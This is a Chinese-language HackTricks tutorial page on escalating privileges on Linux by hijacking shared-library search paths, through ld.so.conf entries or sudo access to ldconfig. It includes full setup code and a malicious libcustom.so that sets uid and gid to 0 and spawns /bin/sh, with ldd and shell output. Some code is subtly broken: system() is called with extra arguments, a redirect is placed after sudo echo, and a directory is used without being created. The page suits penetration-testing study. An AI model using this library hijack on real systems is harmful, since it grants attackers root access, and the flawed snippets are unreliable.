# ld.so 权限提升漏洞示例

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 准备环境

在以下部分，您可以找到我们将用来准备环境的文件代码

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **创建** 你的机器上同一文件夹中的这些文件
2. **编译** **库文件**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **复制** `libcustom.so` 到 `/usr/lib`：`sudo cp libcustom.so /usr/lib`（需要root权限）
4. **编译** **可执行文件**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

确认 _libcustom.so_ 正在从 _/usr/lib_ **加载**，并且你可以**执行**二进制文件。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## 利用

在这个场景中，我们假设**有人在_/etc/ld.so.conf/_文件中创建了一个易受攻击的条目**：
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
```markdown
易受攻击的文件夹是 _/home/ubuntu/lib_（我们有写入权限的地方）。
**下载并编译**以下代码在该路径内：
```
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
现在我们已经在配置错误的路径中**创建了恶意的 libcustom 库**，我们需要等待**重启**或者等待 root 用户执行 **`ldconfig`**（_如果你可以作为 **sudo** 执行这个二进制文件或者它有 **suid 位**，你将能够自己执行它_）。

一旦这发生，**重新检查** `sharevuln` 可执行文件从哪里加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
如您所见，它**从 `/home/ubuntu/lib` 加载**，如果任何用户执行它，将执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
请注意，在此示例中我们并未提升权限，但通过修改执行的命令并**等待 root 或其他具有特权的用户执行易受攻击的二进制文件**，我们将能够提升权限。
{% endhint %}

### 其他错误配置 - 相同漏洞

在前面的示例中，我们伪造了一个错误配置，管理员在 `/etc/ld.so.conf.d/` 内的配置文件中**设置了一个非特权文件夹**。\
但是，如果您对 `/etc/ld.so.conf.d` 内的某些**配置文件**、文件夹 `/etc/ld.so.conf.d` 或文件 `/etc/ld.so.conf` 有**写权限**，还有其他错误配置可能导致相同的漏洞，您可以配置相同的漏洞并利用它。

## 利用 2

**假设您对 `ldconfig` 有 sudo 权限**。\
您可以指示 `ldconfig` **从哪里加载配置文件**，因此我们可以利用它让 `ldconfig` 加载任意文件夹。\
那么，让我们创建文件和文件夹以加载 "/tmp"：
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如**前面的漏洞**所示，**在`/tmp`内创建恶意库**。\
最后，让我们加载路径并检查二进制文件从哪里加载库：
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**正如您所见，如果您对`ldconfig`有sudo权限，您可以利用相同的漏洞。**

{% hint style="info" %}
我**没有找到**一个可靠的方法来利用这个漏洞，如果`ldconfig`配置了**suid位**。以下错误会出现：`/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## 参考资料

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTB中的Dab机器

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>
